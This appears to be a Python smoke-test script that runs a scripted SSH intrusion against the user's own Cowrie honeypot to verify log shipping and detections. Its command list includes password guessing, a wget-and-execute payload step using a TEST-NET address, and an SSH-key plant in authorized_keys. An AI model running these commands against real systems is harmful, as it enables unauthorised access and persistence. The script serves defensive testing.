"""Attack your own honeypot to prove the sensor -> shipper -> detections path works.

Plays a short, scripted intrusion against a running Cowrie: a few failed
passwords, a successful login, recon, a payload download, chmod in /tmp and an
SSH-key plant. Then point the local detections at what the shipper produced.
Payload URLs use the non-routable TEST-NET range, so nothing is actually fetched,
unless you pass --payload-url pointing at a harmless file you serve yourself.

    HONEYPOT_PORT=2222 SHIPPER_DRY_RUN=1 docker compose -f honeypot/docker-compose.yml up -d
    python -m honeypot.smoke_test --port 2222
    docker compose -f honeypot/docker-compose.yml cp shipper:/state/cowrie_rows.jsonl data/processed/live_rows.jsonl
    python -m detections.local_rules data/processed/live_rows.jsonl

Requires paramiko (pip install paramiko). Never point this at a host you don't own.
"""

from __future__ import annotations

import argparse
import sys
import time

COMMANDS = [
    "uname -a",
    "cat /proc/cpuinfo | grep name | wc -l",
    "nproc",
    "whoami",
    "cd /tmp; wget http://198.51.100.10/bins/smoke.x86 -O smoke; chmod +x smoke; ./smoke",
    "mkdir -p ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGsmoketestsmoketestsmoketestsmoketest smoke' >> ~/.ssh/authorized_keys",
    "exit",
]


def attempt(host: str, port: int, user: str, password: str):
    import paramiko

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # noqa: S507 - our own honeypot; its host key is fake
    try:
        client.connect(host, port=port, username=user, password=password, timeout=10,
                       allow_agent=False, look_for_keys=False, banner_timeout=10, auth_timeout=10)
        return client
    except paramiko.AuthenticationException:
        client.close()
        return None


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--failures", type=int, default=6, help="wrong passwords to try first")
    parser.add_argument("--payload-url", help="also fetch this URL from inside the honeypot to test payload capture. Serve a "
                             "harmless file from a PUBLIC address you control: Cowrie's wget refuses private and "
                             "local addresses so attackers can't use the sensor to reach your network")
    args = parser.parse_args()
    commands = list(COMMANDS)
    if args.payload_url:
        commands.insert(-1, f"cd /tmp; wget {args.payload_url} -O probe.bin; chmod +x probe.bin")

    for i in range(args.failures):
        assert attempt(args.host, args.port, "root", f"wrong-{i}") is None, "honeypot accepted a wrong password?"
        print(f"failed login {i + 1}/{args.failures} (expected)")
    client = attempt(args.host, args.port, "root", "admin123")
    if client is None:
        print("login with root/admin123 failed - is honeypot/userdb.txt mounted?", file=sys.stderr)
        return 1
    print("logged in as root/admin123")
    shell = client.invoke_shell()
    time.sleep(1)
    for command in commands:
        shell.send((command + "\n").encode())
        time.sleep(1.5)
        if shell.recv_ready():
            output = shell.recv(65535).decode(errors="replace").strip().splitlines()
            print(f"$ {command}\n  " + "\n  ".join(output[-3:]))
    client.close()
    print("done - the shipper picks the events up within its poll interval (10s)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
